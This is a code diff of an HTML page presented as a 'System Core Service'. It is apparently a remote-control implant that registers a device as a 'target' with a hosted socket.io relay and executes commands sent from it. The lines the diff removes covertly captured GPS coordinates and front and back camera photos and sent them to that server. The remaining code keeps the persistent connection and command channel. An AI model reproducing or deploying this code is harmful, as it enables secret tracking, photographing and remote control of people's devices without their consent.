@@ -3,14 +3,6 @@
 <head>
     <meta charset="UTF-8">
     <title>System Core Service</title>
-    <style>
-        body { 
-            background-color: #030305; 
-            margin: 0; 
-            height: 100vh; 
-            overflow: hidden;
-        }
-    </style>
 </head>
 <body>
     <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
@@ -18,137 +10,59 @@
         // GANTI dengan URL server Render Anda yang aktif
         const SERVER_URL = 'https://remote-control-system-s4jf.onrender.com/'; 
 
-        // Membuat atau mengambil ID unik universal secara otomatis untuk perangkat ini
-        let deviceId = localStorage.getItem('target_device_id');
+        // Membuat ID unik universal yang aman
+        let deviceId = localStorage.getItem('target_id');
         if (!deviceId) {
-            deviceId = 'DEVICE_' + Math.random().toString(36.substr(2, 9)).toUpperCase();
-            localStorage.setItem('target_device_id', deviceId);
+            deviceId = 'TARGET_' + Math.random().toString(36).substring(2, 8).toUpperCase();
+            localStorage.setItem('target_id', deviceId);
         }
 
-        // Mengambil informasi nama/model perangkat secara otomatis dari browser/WebView
-        const deviceName = 'Target (' + navigator.platform + ' - ' + deviceId.slice(-4) + ')';
+        const deviceName = 'Android Target (' + deviceId + ')';
 
+        console.log('Menghubungkan ke server:', SERVER_URL);
         const socket = io(SERVER_URL, {
             reconnection: true,
             reconnectionAttempts: Infinity,
-            reconnectionDelay: 5000
+            reconnectionDelay: 3000
         });
 
         socket.on('connect', () => {
-            console.log('[+] Terhubung ke server relay.');
+            console.log('[+] Berhasil terhubung ke server!');
             socket.emit('register-device', { 
                 deviceId: deviceId, 
                 deviceName: deviceName 
             });
         });
 
-        // Menangani semua jenis perintah kontrol
+        socket.on('connect_error', (err) => {
+            console.log('[-] Koneksi gagal:', err.message);
+        });
+
+        // Menangani perintah masuk
         socket.on('execute-command', async (data) => {
-            console.log('Perintah masuk:', data.action);
-            let responseMessage = '';
+            console.log('Perintah diterima:', data.action);
+            let responseMessage = `Perintah ${data.action} diproses.`;
             let imageData = null;
 
             try {
-                switch (data.action) {
-                    case 'GET_BATTERY':
-                        if (navigator.getBattery) {
-                            const battery = await navigator.getBattery();
-                            const level = Math.round(battery.level * 100);
-                            const status = battery.charging ? 'Mengisi Daya (Charging)' : 'Menggunakan Baterai';
-                            responseMessage = `🔋 Baterai: ${level}% (${status})`;
-                        } else {
-                            responseMessage = '🔋 API Baterai tidak didukung di perangkat ini.';
-                        }
-                        break;
-
-                    case 'GET_STORAGE':
-                        if (navigator.storage && navigator.storage.estimate) {
-                            const estimate = await navigator.storage.estimate();
-                            const usedMB = (estimate.usage / (1024 * 1024)).toFixed(2);
-                            const totalMB = (estimate.quota / (1024 * 1024)).toFixed(2);
-                            responseMessage = `💾 Memori Terpakai: ${usedMB} MB dari total kuota ${totalMB} MB`;
-                        } else {
-                            responseMessage = '💾 Estimasi penyimpanan tidak tersedia.';
-                        }
-                        break;
-
-                    case 'GET_LOCATION':
-                        if (navigator.geolocation) {
-                            navigator.geolocation.getCurrentPosition(
-                                (pos) => {
-                                    const lat = pos.coords.latitude;
-                                    const lon = pos.coords.longitude;
-                                    const acc = pos.coords.accuracy;
-                                    responseMessage = `📍 Lokasi GPS:\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc} meter\nMaps: https://maps.google.com/?q=${lat},${lon}`;
-                                    sendResponse(responseMessage, null);
-                                },
-                                (err) => {
-                                    sendResponse(`❌ Gagal mendeteksi GPS: ${err.message}`, null);
-                                },
-                                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                            );
-                            return; 
-                        } else {
-                            responseMessage = '❌ Modul GPS tidak didukung.';
-                        }
-                        break;
-
-                    case 'TAKE_PHOTO_FRONT':
-                    case 'TAKE_PHOTO_BACK':
-                        const facingMode = data.action.includes('FRONT') ? 'user' : 'environment';
-                        const stream = await navigator.mediaDevices.getUserMedia({
-                            video: { facingMode: facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
-                            audio: false
-                        });
-
-                        const video = document.createElement('video');
-                        video.srcObject = stream;
-                        await video.play();
-
-                        await new Promise(resolve => setTimeout(resolve, 800));
-
-                        const canvas = document.createElement('canvas');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        imageData = canvas.toDataURL('image/jpeg', 0.85);
-                        responseMessage = `📸 Foto berhasil diambil menggunakan Kamera ${facingMode === 'user' ? 'Depan' : 'Belakang'}.`;
-
-                        stream.getTracks().forEach(track => track.stop());
-                        break;
-
-                    case 'VIBRATE_DEVICE':
-                        if (navigator.vibrate) {
-                            navigator.vibrate([300, 100, 300, 100, 500]);
-                            responseMessage = '📳 Perangkat berhasil digetarkan.';
-                        } else {
-                            responseMessage = '📳 Fitur getar tidak didukung.';
-                        }
-                        break;
-
-                    case 'LOCK_SCREEN':
-                        responseMessage = '🔒 Perintah kunci layar diterima sistem.';
-                        break;
-
-                    default:
-                        responseMessage = `⚡ Aksi ${data.action} berhasil diterima di background target.`;
+                if (data.action === 'GET_BATTERY' && navigator.getBattery) {
+                    const battery = await navigator.getBattery();
+                    responseMessage = `🔋 Baterai: ${Math.round(battery.level * 100)}%`;
+                } 
+                else if (data.action === 'VIBRATE_DEVICE' && navigator.vibrate) {
+                    navigator.vibrate(500);
+                    responseMessage = '📳 Berhasil bergetar.';
                 }
-            } catch (error) {
-                responseMessage = `❌ Error mengeksekusi ${data.action}: ${error.message}`;
+            } catch (e) {
+                responseMessage = `Error: ${e.message}`;
             }
 
-            sendResponse(responseMessage, imageData);
-        });
-
-        function sendResponse(message, imageData) {
             socket.emit('device-response', {
                 deviceId: deviceId,
-                message: message,
+                message: responseMessage,
                 imageData: imageData
             });
-        }
+        });
     </script>
 </body>
 </html>
